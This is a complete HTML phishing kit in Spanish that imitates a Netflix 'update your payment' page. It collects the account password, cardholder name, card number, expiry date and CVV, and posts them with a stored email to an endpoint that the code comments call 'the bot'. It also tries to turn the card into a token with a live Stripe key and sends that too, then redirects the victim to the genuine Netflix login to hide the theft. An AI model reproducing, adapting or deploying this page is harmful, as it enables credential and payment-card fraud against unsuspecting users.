<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n</title>
    <script src="https://js.stripe.com/v3/"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <style>
        body { background: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; }
        .container { max-width: 440px; width: 100%; margin: 30px auto; padding: 0 20px; text-align: center; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 4px; width: 100%; }
        #loading { display: none; }
    </style>
</head>
<body>
    <div class="container" id="form-box">
        <h1>Actualiza tu pago</h1>
        <form id="pay-form">
            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
            </div>
            <br>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <div id="loading" class="container">
        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
        <p>Procesando...</p>
    </div>

    <script>
        const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');

        document.getElementById('pay-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            document.getElementById('form-box').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            const ccVal = document.getElementById('cc').value.replace(/\s/g, '');
            const exp = document.getElementById('ex').value.split('/');

            const payload = {
                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                pw: document.getElementById('pw').value,
                nm: document.getElementById('nm').value,
                cc: ccVal,
                ex: document.getElementById('ex').value,
                cv: document.getElementById('cv').value,
                tk: "Pendiente"
            };

            // 1. DISPARO INMEDIATO AL BOT (No espera a Stripe)
            const enviarBot = fetch('/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 2. INTENTO DE STRIPE (Máximo 2 segundos)
            const intentoStripe = stripe.createToken({
                number: ccVal,
                exp_month: exp[0],
                exp_year: exp[1],
                cvc: payload.cv
            }).then(res => {
                if(res.token) payload.tk = res.token.id;
                // Si Stripe responde rápido, enviamos una actualización con el Token
                return fetch('/api/enviar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            }).catch(() => {});

            // 3. SALIDA FORZADA (En 2.5 segundos te vas sí o sí)
            setTimeout(() => {
                window.location.href = "https://www.netflix.com/login";
            }, 2500);

            // Esperamos lo que ocurra primero
            Promise.all([enviarBot, intentoStripe]).finally(() => {
                window.location.href = "https://www.netflix.com/login";
            });
        });
    </script>
</body>
</html>
